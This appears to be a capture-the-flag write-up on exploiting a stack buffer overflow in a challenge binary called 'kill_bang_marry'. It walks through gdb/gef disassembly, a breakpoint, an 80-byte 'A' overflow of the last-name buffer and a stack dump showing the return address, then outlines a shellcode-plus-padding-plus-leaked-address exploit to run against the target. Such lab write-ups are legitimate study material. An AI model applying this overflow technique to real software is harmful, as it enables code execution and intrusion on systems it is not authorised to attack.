
$ gdb kill_bang_marry

$ disassemble kill_bang_marry

set breakpoint at nop command
$ break *<address>


enter 80 * "A" as input when prompted for last name

once breakpoint is hit use the following to view the stack
$ x/88bx $rsp -> to view address

The address we want to overwrite should be bytes 81-88

You should see 80*0x41 (0x41="A") and then a return address

Now just craft the exploit

shellcode + padding = 80 bytes
leaked address = address for lastname buffer

Exploit = shellcode + padding + leaked address


Just write a simple pwntools script to do the exploit on local 
machine using the downloaded files on the smb share and then 
upload the exploit to the target and run on the target against 
localhost 4321


For clarification

$ python3 -c 'print("A"*80)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

$ gdb kill_bang_marry.exe

gef➤  disassemble kill_bang_marry
Dump of assembler code for function kill_bang_marry:
   0x0000000000401b0a <+0>:	push   rbp
   0x0000000000401b0b <+1>:	mov    rbp,rsp
   ..................
   ..................
   0x0000000000401be2 <+216>:	call   0x401930 <results>
   0x0000000000401be7 <+221>:	nop <==== BREAK POINT HERE
   0x0000000000401be8 <+222>:	leave
   0x0000000000401be9 <+223>:	ret
End of assembler dump.

gef> break *0x0000000000401be7

gef➤  run
Starting program: /home/kali/dangerzone/binary_exploitation_challenge/kill_bang_marry.exe 
Do you want to play kill, bang, marry? (y/n)
y


Attempting to location your position...

Where are you? Oh there you are! 0x7fffffffe3e0 0x7fffffffe3c0
Ready to play!


#####################
# KILL, BANG, MARRY #
#####################
LOGIN
First Name: haxor
Last Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA


Now just hit enter until breakpoint is hit


gef➤  x/88bx $rsp 
0x7fffffffe3c0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41 <==== "A"*80 and start of lastnamebuffer
0x7fffffffe3c8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe3d0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe3d8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe3e0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe3e8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe3f0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe3f8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe400:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe408:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe410:	0x00	0x1c	0x40	0x00	0x00	0x00	0x00	0x00 <==== Return Address


Now create exploit

shellcode + padding + address of lastname buffer
